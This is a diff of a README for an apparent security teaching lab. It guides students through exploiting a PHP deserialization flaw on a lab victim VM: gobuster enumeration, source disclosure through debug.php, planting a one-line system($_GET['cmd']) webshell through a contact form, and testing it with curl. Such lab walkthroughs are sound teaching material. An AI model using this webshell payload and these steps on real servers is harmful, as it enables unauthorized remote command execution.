@@ -92,31 +92,35 @@ vulnerabilities compared to other serialization methods like "serialize()" and
 
 ![victim terminal](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/33064a4c-5a86-4e51-bb3c-44a057f0f4e9)
 
-![victim-ip](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/cf19b27a-1609-480e-bee0-5206a11fc098)
+
 
 4. launch the hacker’s web interfaces in separate browser tabs by clicking the icon next to the deserialization:
 
 ![attacker-link](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/f39fc9c6-f46f-4476-84e2-03a2ec342e02)
 
-5. On the deserialization vm, open firefox browser, or install any browser you like. Enter http://victim_ip to the URL bar to access the VNC session
+5. On the deserialization(hacker) vm, open firefox browser, or install any browser you like. Enter http://victim_ip to the URL bar to access the VNC session
 
 ![attacker-victim-vnc](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/f2223721-b7fd-4914-abb3-825c9de2ec30)
 
 6. Try going through the website like a normal user, is there anywhere you can exploit, anything you can enter?
 
-Then, on the deserialization vm. use the command gobuster -w /wordlist/wordlist_php -u http://victim_ip to list the directory and hidden file on the webserver. Feel free to try other web enumeration tools, and use different wordlist as well.
+Then, on the deserialization(hacker) vm. use the command gobuster dir -w /wordlist/wordlist_php -u http://victim_ip:8080 to list the directory and hidden file on the webserver. Feel free to try other web enumeration tools, and use different wordlist as well.
 
-![gobuster-command-1](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/8b1e4422-43c3-426b-90aa-eaa4a78358cc)
+![hacker gobuster](https://github.com/markyu0401/Deserialization-Attack/blob/main/fig/hacker%20gobuster.png?raw=true)
+
+
 
 7. After running the gobuster rto enumerate the hidden file on the webserver, you will find a new file called debug.php running on the website. To open debug.php, use the command http://victim_ip/debug.php
 
 ![webpage-debug](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/1bb997d9-f217-47a0-84de-007e821cc54e)
 
 8. Now you have found the debug.php, it’s a mistake made by the developer. To access the
-source code of debug.php, you can enter the URL: viewsource:http://<victim's IP address>/debug.php?read=debug.php to view the source code of the
+source code of debug.php, you can enter the URL: http://<victim's IP address>:8080/debug.php?read=debug.php to view the source code of the
 debug.php.
 
-![webpage-debug-2](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/ad22bd72-e436-4949-8ff3-d512471af9f8)
+![debug php sourcecode](https://github.com/markyu0401/Deserialization-Attack/blob/main/fig/debug%20php%20sourcecode.png?raw=true)
+
+
 
 9. In the source code of debug.php, there are two Get parameters you can manipulate. One is called read and the other is execute. read can let you check the source code of the websites and execute will allow you to execute file contain PHP source code
 
@@ -124,7 +128,8 @@ debug.php.
 
 10. When you run the gobuster tool, I am sure you have also found another php file called contact.php. contact.php is the file where the website will process the contact information entered by user, we can see the source code of this file by entering the URL: http://<victim's IP address>/debug.php?read=contact.php
 
-![webpage-debug-3](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/abff5019-6327-446b-b0fc-91bf59594dfb)
+![debug sourcecode](https://github.com/markyu0401/Deserialization-Attack/blob/main/fig/debug%20sourcecode.png?raw=true)
+
 
 11. Upon reviewing the source code of contact.php file, what have you found? There is a critical vulnerability in the file, a deserialization vulnerability.
 
@@ -171,15 +176,17 @@ the URL http://victim_ip/contact.html to access the page.
 
 15. To exploit the vulnerability we see before, enter test in the name bar, enter user.php in the
 email bar, and <?php $exec = system( $_GET['cmd'] ) ?> in the comment section. After
-entering all the text, click submit to plant the webshell
+entering all the text, click submit to plant the webshell ``<?php $exec = system($_GET['cmd'] ) ?> ``
 
 ![demodiagram3](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/47192691-5a79-4f79-88e7-0f2e0384e999)
 
 16. On the attacker VM, use the command curl
 http://victim_ip/user_info/test_user.php?cmd=whoami to test whether the planted
 webshell is working or not.
+You can also try http://victim_ip/user_info/test_user.php?cmd=ifconfig
 
-![result](https://github.com/markyu0401/Deserialization-Attack/assets/60618569/f3c29b0e-0756-48ce-97bf-e5058091f85f)
+![result](https://github.com/markyu0401/Deserialization-Attack/blob/main/fig/result%20.png?raw=true)
+
 
 17. A secure server is running on the Secure server's IP address, you are welcome to try attacking
 it, but it does not have the deserialization vulnerability and misconfiguration present on
